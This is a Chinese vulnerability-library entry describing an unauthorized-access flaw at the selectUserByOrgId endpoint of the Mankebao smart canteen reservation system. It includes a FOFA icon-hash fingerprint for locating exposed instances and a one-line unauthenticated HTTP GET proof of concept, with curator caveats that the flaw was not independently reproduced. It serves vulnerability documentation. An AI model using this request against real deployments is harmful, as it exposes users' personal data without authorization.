---
source: "wy876 漏洞文库"
title: "满客宝智慧食堂预定 selectUserByOrgId信息暴露"
product: "满客宝智慧食堂预定"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "标题未授权，缺对照"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ikk2p8bp66933w1b"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%BB%A1%E5%AE%A2%E5%AE%9D/%E6%BB%A1%E5%AE%A2%E5%AE%9D%E6%99%BA%E6%85%A7%E9%A3%9F%E5%A0%82%E9%A2%84%E5%AE%9A%E7%B3%BB%E7%BB%9FselectUserByOrgId%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md"
fofa: "icon_hash=\"-409875651\" "
fofa_unverified: "icon_hash="
id: "vw-22312ebc4a751c5a3f513765"
entity_id: "ve-22312ebc4a751c5a3f513765"
schema_version: "1"
---

# 满客宝智慧食堂预定 selectUserByOrgId信息暴露

## 条目说明

- 对象与具体问题：满客宝智慧食堂预定；selectUserByOrgId信息暴露
- 版本、配置及部署条件：无版本
- 认证与权限前提：标题未授权，缺对照
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同86请求，产品目录应统一而非智慧城市
- FOFA截断，HTTPjava标签，无响应数据字段
- 不能从端点名字断言密码泄漏，需86截图补文字核对

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
满客宝智慧食堂预定系统selectUserByOrgId 存在未授权访问漏洞

## 二、影响版本
+ 满客宝智慧食堂预定系统

## 三、资产测绘
+ fofa`icon_hash="-409875651" `
+ 特征


## 四、漏洞复现
```http
GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ikk2p8bp66933w1b>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
